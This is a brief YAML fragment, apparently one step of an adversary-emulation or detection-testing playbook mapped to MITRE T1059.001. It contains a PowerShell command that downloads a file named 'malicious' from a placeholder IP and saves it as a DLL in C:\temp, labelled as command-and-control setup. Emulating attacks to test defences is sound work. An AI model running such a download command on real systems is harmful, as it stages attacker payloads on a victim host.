- id: step-04
  name: Initiate C2 Communication
  command: powershell.exe -Command "Invoke-WebRequest -Uri 'http://192.0.2.1/malicious' -OutFile 'C:\\temp\\malicious.dll'"
  identity: direct
  mitre_technique: T1059.001
  platforms:
